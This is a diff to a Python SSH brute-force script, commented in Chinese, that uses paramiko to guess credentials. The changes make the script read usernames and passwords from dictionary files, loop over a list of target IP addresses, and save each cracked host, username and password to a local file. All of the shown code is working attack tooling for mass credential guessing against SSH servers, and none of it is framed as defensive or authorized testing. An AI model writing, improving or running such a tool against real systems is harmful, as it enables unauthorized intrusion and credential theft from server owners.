@@ -39,21 +39,21 @@ ssh = paramiko.SSHClient()
 # 允许连接不在~/.ssh/known_hosts文件中的主机
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-
-def brute_ssh(hostname, port='22', username='root', password='', username_list='', password_list=''):
+f = open("s.txt","w+")
+def brute_ssh(hostname, port='22', username_list='', password_list=''):
     # 初始化list
-    usernames = []
-    passwords = []
+    usernames = load_file(username_list)
+    passwords = load_file(password_list)
 
     # 根据参数判断是否需要载入字典，不需要则list只有一个值
-    if username_list != '':
-        usernames = load_file(username_list)
-    else:
-        usernames.append(username)
-    if password_list != '':
-        passwords = load_file(password_list)
-    else:
-        passwords.append(password)
+    # if username_list != '':
+    #     usernames = load_file(username_list)
+    # else:
+    #     usernames.append(username)
+    # if password_list != '':
+    #     passwords = load_file(password_list)
+    # else:
+    #     passwords.append(password)
 
 
     count = 0  # 计数
@@ -71,6 +71,7 @@ def brute_ssh(hostname, port='22', username='root', password='', username_list='
                 print('[!] Cracking success!')
                 print('[*] username=>' + u)
                 print('[*] password=>' + p)
+                f.writelines(hostname+"  "+u+"  "+p+"\n")
                 break
             except:
                 pass
@@ -111,8 +112,6 @@ if __name__ == '__main__':
     # logo()
     # hostname = ''
     port = 22
-    username = 'root'
-    password = ''
     username_list = '../ssh_fuce_dict1.txt'
     password_list = '../ssh_fuce_dict1.txt'
     # try:
@@ -140,4 +139,4 @@ if __name__ == '__main__':
     # 开始爆破
     ssh_ips = load_file("../ssh_fuce_ip1.txt")
     for hostname in ssh_ips:
-        brute_ssh(hostname=hostname, port=port, username=username, password=password, password_list=password_list)
+        brute_ssh(hostname=hostname, port=port, username_list=username_list, password_list=password_list)
